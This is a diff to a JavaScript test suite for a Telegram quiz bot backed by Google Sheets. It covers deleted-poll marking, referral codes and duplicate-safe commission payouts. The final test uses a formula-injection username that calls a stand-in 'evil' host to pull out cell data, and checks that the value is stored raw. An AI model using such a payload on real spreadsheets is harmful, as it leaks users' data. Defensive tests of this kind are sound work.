@@ -490,22 +490,22 @@ test('repairing a tab restores the header, the widths, the panes and the colour 
   const rules = requests.filter((r) => r.addConditionalFormatRule)
     .map((r) => r.addConditionalFormatRule.rule.booleanRule.condition.values[0].userEnteredValue);
   assert.deepEqual(rules, ['YES', 'NO', 'Approved', 'Posted', 'Scheduled', 'Review',
-    'Rejected', 'Archived', 'Easy', 'Medium', 'Hard']);
+    'Rejected', 'Archived', 'Deleted', 'Easy', 'Medium', 'Hard']);
 });
 
 test('repairing twice does not leave two of every colour rule behind', async () => {
   const book = { Physics: [HEADERS, question(1)] };
   const log = fakeSheets(book);
   // What the sheet already carries from the first repair.
-  log.existingRules = new Array(11).fill({});
+  log.existingRules = new Array(12).fill({});
 
   await DIRECT.formatQuestions(ctx, 'Physics');
 
   const deletes = log.formatRequests.filter((r) => r.deleteConditionalFormatRule);
-  assert.equal(deletes.length, 11, 'the rules already there were not cleared first');
+  assert.equal(deletes.length, 12, 'the rules already there were not cleared first');
   // Highest index first: deleting index 0 first would renumber the rest.
   assert.deepEqual(deletes.map((d) => d.deleteConditionalFormatRule.index),
-    [10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0]);
+    [11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0]);
 });
 
 test('an empty tab is still styled rather than skipped for having no rows', async () => {
@@ -530,4 +530,297 @@ test('the long-form columns wrap and the rest stay on one line', async () => {
 test('repairing a tab that is not there says which one', async () => {
   fakeSheets({ Physics: [HEADERS] });
   await assert.rejects(DIRECT.formatQuestions(ctx, 'Nope'), /Sheet tab "Nope" not found/);
+});
+
+// ---------------------------------------------------------------------------
+// A poll deleted from Telegram
+// ---------------------------------------------------------------------------
+// Telegram never tells a bot one of its messages was deleted, so the sheet used
+// to claim for ever that a removed question was posted. Marking it is only half
+// the job; the other half is that the row must not quietly become eligible
+// again and go back out.
+
+test('a deleted poll is marked Deleted and keeps Posted = YES, so it is never re-sent', async () => {
+  const book = { Physics: [HEADERS,
+    question(1, { Posted: 'YES', Status: 'Posted', 'Telegram Msg ID': 901 })] };
+  fakeSheets(book);
+
+  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [2], 'Deleted from the Telegram group'), 1);
+
+  const row = book.Physics[1];
+  assert.equal(row[col('Status')], 'Deleted');
+  assert.equal(row[col('Posted')], 'YES',
+    'clearing Posted would put the question back in the queue and post it again');
+  assert.equal(row[col('Telegram Msg ID')], 901, 'the record of what was deleted stays');
+  assert.equal(row[col('Updated By')], 'Deleted-poll check');
+  assert.match(row[col('Review Notes')], /^\[.* IST\] Deleted from the Telegram group$/);
+
+  // And the posting queue agrees: it is not eligible.
+  const queue = await DIRECT.getUnpostedQuestions(ctx, 'Physics', 10, true);
+  assert.deepEqual(queue.map((q) => q.excel_row), []);
+});
+
+test('a note is added to whatever the row already said, not over it', async () => {
+  const book = { Physics: [HEADERS,
+    question(1, { Posted: 'YES', Status: 'Posted', 'Review Notes': 'checked by Ravi' })] };
+  fakeSheets(book);
+  await DIRECT.markDeleted(ctx, 'Physics', [2], 'Deleted from the Telegram group');
+  assert.match(book.Physics[1][col('Review Notes')], /^checked by Ravi\n\[.* IST\] Deleted from/);
+});
+
+test('marking skips a row that is not posted, and one already marked', async () => {
+  const book = { Physics: [HEADERS,
+    question(1, { Posted: 'NO', Status: 'Approved' }),
+    question(2, { Posted: 'YES', Status: 'Deleted' }),
+    question(3, { Posted: 'YES', Status: 'Posted' })] };
+  const log = fakeSheets(book);
+
+  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [2, 3, 4], 'gone'), 1);
+  assert.equal(book.Physics[1][col('Status')], 'Approved', 'an unposted row cannot have been deleted');
+  assert.equal(book.Physics[3][col('Status')], 'Deleted');
+  // Re-marking would append the same note again on every nightly sweep.
+  assert.equal(log.writes.filter((w) => w.row === 3).length, 0);
+});
+
+test('a marked question is not offered to the next sweep', async () => {
+  // Otherwise every sweep would re-ask Telegram about a message everyone
+  // agrees is gone, and spend its budget there instead of on unchecked rows.
+  const book = { Physics: [HEADERS,
+    question(1, { Posted: 'YES', Status: 'Posted', 'Telegram Msg ID': 901 }),
+    question(2, { Posted: 'YES', Status: 'Deleted', 'Telegram Msg ID': 902 })] };
+  fakeSheets(book);
+
+  const posted = await DIRECT.listPosted(ctx, 'Physics');
+  assert.deepEqual(posted.map((p) => p.message_id), ['901']);
+});
+
+test('marking nothing writes nothing', async () => {
+  const book = { Physics: [HEADERS, question(1, { Posted: 'YES', Status: 'Posted' })] };
+  const log = fakeSheets(book);
+  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [], 'gone'), 0);
+  assert.equal(await DIRECT.markDeleted(ctx, 'Physics', [99], 'gone'), 0);
+  assert.equal(log.writes.length, 0);
+});
+
+test('Deleted is a status the poster owns, not one a curator sets by hand', async () => {
+  // Setting it by hand would leave Status saying Deleted on a row that is
+  // still in the channel, which is the same desynchronisation as Posted.
+  const book = { Physics: [HEADERS, question(1, { 'Question ID': 'A' })] };
+  fakeSheets(book);
+  await assert.rejects(DIRECT.bulkStatus(ctx, 'Physics', ['A'], 'Deleted', 'C'), /set by the poster/);
+});
+
+test('a marked question can still be put back deliberately', async () => {
+  // Re-queueing is the separate, explicit decision — for a poll deleted by
+  // accident that a curator does want posted again.
+  const book = { Physics: [HEADERS,
+    question(1, { Posted: 'YES', Status: 'Deleted', 'Telegram Msg ID': 901 })] };
+  fakeSheets(book);
+
+  assert.equal(await DIRECT.unpostQuestions(ctx, 'Physics', [2], 'Approved'), 1);
+  assert.equal(book.Physics[1][col('Posted')], 'NO');
+  assert.equal(book.Physics[1][col('Status')], 'Approved');
+  assert.equal(book.Physics[1][col('Telegram Msg ID')], '');
+
+  const queue = await DIRECT.getUnpostedQuestions(ctx, 'Physics', 10, true);
+  assert.deepEqual(queue.map((q) => q.excel_row), [2], 'it is eligible again, on purpose');
+});
+
+// ---------------------------------------------------------------------------
+// Referrals
+// ---------------------------------------------------------------------------
+// Two tabs, created on first use. The one that matters most is the log: it is
+// what answers "who joined using whose code", and it is the record a payout is
+// made from, so a sale counted twice is money paid twice.
+
+const REFERRAL_HEADERS = ['Code', 'Telegram ID', 'Username', 'Name', 'Status', 'Created At', 'Notes'];
+const LOG_HEADERS = ['Timestamp', 'Code', 'Referrer ID', 'Referrer Username', 'Referred ID',
+  'Referred Username', 'Referred Name', 'Group', 'Payment ID', 'Original Amount', 'Discount',
+  'Paid Amount', 'Commission', 'Status', 'Paid At', 'Notes'];
+
+/** A book with both referral tabs already present. */
+function referralBook(codes = [], log = []) {
+  return {
+    Referrals: [REFERRAL_HEADERS, ...codes],
+    'Referral Log': [LOG_HEADERS, ...log]
+  };
+}
+
+const codeRow = (code, id, username = '', status = 'active') =>
+  [code, id, username, '', status, '01-01-2026, 10:00:00 AM IST', ''];
+
+const logRow = (code, referrer, referred, paymentId, commission, status = 'pending') =>
+  ['01-01-2026, 10:00:00 AM IST', code, referrer, '', referred, '', '', 'Group',
+    paymentId, 199, 19.9, 179.1, commission, status, '', ''];
+
+test('the referral tabs are created the first time they are needed', async () => {
+  const book = {};
+  fakeSheets(book);
+
+  const made = await DIRECT.createReferral(ctx, {
+    telegram_id: '111', username: 'asha', name: 'Asha K', code: 'REFAJMXPQ'
+  });
+
+  assert.equal(made.code, 'REFAJMXPQ');
+  assert.equal(made.status, 'active');
+  assert.deepEqual(book.Referrals[0], REFERRAL_HEADERS, 'the tab was made with its headers');
+  assert.equal(book.Referrals[1][0], 'REFAJMXPQ');
+  assert.equal(book.Referrals[1][1], '111');
+  assert.equal(book.Referrals[1][2], 'asha');
+});
+
+test('asking twice gives the same code, never a second one', async () => {
+  // Two codes for one member would split their earnings, and neither half
+  // would ever reach a payout.
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
+  const log = fakeSheets(book);
+
+  const again = await DIRECT.createReferral(ctx, {
+    telegram_id: '111', username: 'asha', name: 'Asha K', code: 'REFWMXD9N'
+  });
+
+  assert.equal(again.code, 'REFAJMXPQ', 'the code they already had');
+  assert.equal(book.Referrals.length, 2, 'no second row');
+  assert.equal(log.appends || 0, 0);
+});
+
+test('a code that is already taken is refused, so the caller can try again', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111')]);
+  fakeSheets(book);
+  await assert.rejects(
+    DIRECT.createReferral(ctx, { telegram_id: '222', code: 'REFAJMXPQ' }),
+    (err) => err.codeTaken === true
+  );
+});
+
+test('a code is found by its own name and by its owner', async () => {
+  fakeSheets(referralBook([codeRow('REFAJMXPQ', '111', 'asha'), codeRow('REFWMXD9N', '222')]));
+
+  assert.equal((await DIRECT.getReferral(ctx, 'REFAJMXPQ')).telegram_id, '111');
+  assert.equal((await DIRECT.getReferral(ctx, 'refajmxpq')).telegram_id, '111', 'case does not matter');
+  assert.equal(await DIRECT.getReferral(ctx, 'REFNOPE22'), null);
+  assert.equal((await DIRECT.getReferralFor(ctx, '222')).code, 'REFWMXD9N');
+  assert.equal((await DIRECT.getReferralFor(ctx, 222)).code, 'REFWMXD9N', 'a number id works too');
+  assert.equal(await DIRECT.getReferralFor(ctx, '999'), null);
+});
+
+test('a code can be switched off without touching what it earned', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111')], [logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82)]);
+  fakeSheets(book);
+
+  assert.equal(await DIRECT.setReferralStatus(ctx, 'REFAJMXPQ', 'disabled'), 1);
+  assert.equal(book.Referrals[1][4], 'disabled');
+  assert.equal(book['Referral Log'][1][13], 'pending', 'the earning is untouched');
+
+  assert.equal(await DIRECT.setReferralStatus(ctx, 'REFNOPE22', 'disabled'), 0);
+});
+
+test('one referred payment is one row, naming both sides', async () => {
+  const book = referralBook([codeRow('REFAJMXPQ', '111', 'asha')]);
+  fakeSheets(book);
+
+  const result = await DIRECT.recordReferralEarning(ctx, {
+    code: 'REFAJMXPQ',
+    referrer_telegram_id: '111', referrer_username: 'asha',
+    referred_telegram_id: '222', referred_username: 'ravi', referred_name: 'Ravi T',
+    group: 'APPSC Telugu', payment_id: 'pay_ABC',
+    original_paise: 19900, discount_paise: 1990, paid_paise: 17910, commission_paise: 3582
+  });
+
+  assert.equal(result.recorded, true);
+  const row = book['Referral Log'][1];
+  assert.equal(row[1], 'REFAJMXPQ');
+  assert.equal(row[2], '111', 'who invited');
+  assert.equal(row[4], '222', 'who joined');
+  assert.equal(row[6], 'Ravi T');
+  assert.equal(row[8], 'pay_ABC');
+  assert.equal(row[9], 199, 'rupees in the sheet, paise in the code');
+  assert.equal(row[11], 179.1);
+  assert.equal(row[12], 35.82);
+  assert.equal(row[13], 'pending');
+});
+
+test('the same payment is never credited twice', async () => {
+  // Razorpay retries a webhook on any non-2xx, so one sale can arrive many
+  // times. Without this the inviter is paid once per delivery.
+  const book = referralBook([codeRow('REFAJMXPQ', '111')],
+    [logRow('REFAJMXPQ', '111', '222', 'pay_ABC', 35.82)]);
+  fakeSheets(book);
+
+  const again = await DIRECT.recordReferralEarning(ctx, {
+    code: 'REFAJMXPQ', referrer_telegram_id: '111', referred_telegram_id: '222',
+    payment_id: 'pay_ABC', commission_paise: 3582
+  });
+
+  assert.equal(again.recorded, false);
+  assert.match(again.reason, /already recorded/);
+  assert.equal(book['Referral Log'].length, 2, 'no second row');
+});
+
+test('earnings read back as paise, and can be narrowed to one code', async () => {
+  fakeSheets(referralBook([], [
+    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
+    logRow('REFWMXD9N', '333', '444', 'pay_2', 40),
+    logRow('REFAJMXPQ', '111', '555', 'pay_3', 35.82, 'paid')
+  ]));
+
+  const all = await DIRECT.listReferralEarnings(ctx);
+  assert.equal(all.length, 3);
+  assert.equal(all[0].commission_paise, 3582, 'rupees in the sheet become paise here');
+  assert.equal(all[0].referred_telegram_id, '222');
+
+  const mine = await DIRECT.listReferralEarnings(ctx, 'REFAJMXPQ');
+  assert.deepEqual(mine.map((m) => m.payment_id), ['pay_1', 'pay_3']);
+  assert.equal(mine[1].status, 'paid');
+});
+
+test('settling marks only that code\'s pending rows, and stamps when', async () => {
+  const book = referralBook([], [
+    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
+    logRow('REFAJMXPQ', '111', '333', 'pay_2', 35.82),
+    logRow('REFWMXD9N', '444', '555', 'pay_3', 40)
+  ]);
+  fakeSheets(book);
+
+  const result = await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', [], 'Paid by Admin');
+
+  assert.equal(result.settled, 2);
+  assert.equal(result.paise, 7164);
+  assert.equal(book['Referral Log'][1][13], 'paid');
+  assert.match(book['Referral Log'][1][14], /IST$/, 'when it was paid');
+  assert.equal(book['Referral Log'][1][15], 'Paid by Admin');
+  assert.equal(book['Referral Log'][3][13], 'pending', 'another member is not touched');
+});
+
+test('settling only the payments the admin was looking at', async () => {
+  // An earning recorded between the admin looking and the admin paying must
+  // still be owed afterwards, not silently closed with the rest.
+  const book = referralBook([], [
+    logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82),
+    logRow('REFAJMXPQ', '111', '333', 'pay_NEW', 35.82)
+  ]);
+  fakeSheets(book);
+
+  const result = await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', ['pay_1']);
+  assert.equal(result.settled, 1);
+  assert.equal(book['Referral Log'][1][13], 'paid');
+  assert.equal(book['Referral Log'][2][13], 'pending', 'the one that arrived late is still owed');
+});
+
+test('settling twice pays nothing the second time', async () => {
+  const book = referralBook([], [logRow('REFAJMXPQ', '111', '222', 'pay_1', 35.82, 'paid')]);
+  fakeSheets(book);
+  const result = await DIRECT.settleReferralEarnings(ctx, 'REFAJMXPQ', []);
+  assert.equal(result.settled, 0);
+  assert.equal(result.paise, 0);
+});
+
+test('a username that looks like a formula is stored as text', async () => {
+  const book = referralBook();
+  fakeSheets(book);
+  await DIRECT.createReferral(ctx, {
+    telegram_id: '111', username: '=IMPORTXML("https://evil/"&A1)', code: 'REFAJMXPQ'
+  });
+  // Written RAW, so the sheet keeps it as characters rather than running it.
+  assert.equal(book.Referrals[1][2], '=IMPORTXML("https://evil/"&A1)');
 });
